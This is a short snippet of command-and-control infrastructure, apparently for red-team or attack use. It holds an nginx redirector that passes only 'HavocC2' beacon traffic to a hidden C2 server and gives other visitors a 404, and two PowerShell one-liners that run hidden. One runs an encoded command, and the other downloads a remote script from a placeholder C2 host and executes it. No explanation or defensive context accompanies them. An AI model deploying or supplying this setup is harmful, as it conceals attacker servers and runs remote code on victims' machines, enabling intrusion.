server {
  listen 443 ssl;
  server_name {redirector_domain};
  ssl_certificate /etc/letsencrypt/live/{redirector_domain}/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/{redirector_domain}/privkey.pem;

  # Forward Havoc beacon user-agents only:
  if ($http_user_agent = "HavocC2") {
    proxy_pass https://{real_c2_ip}:443;
  }
  location / { return 404; }
}

powershell -w hidden -nop -enc {base64_encoded_iex_command}
# Or raw:
powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://{c2_server}/s.ps1')"

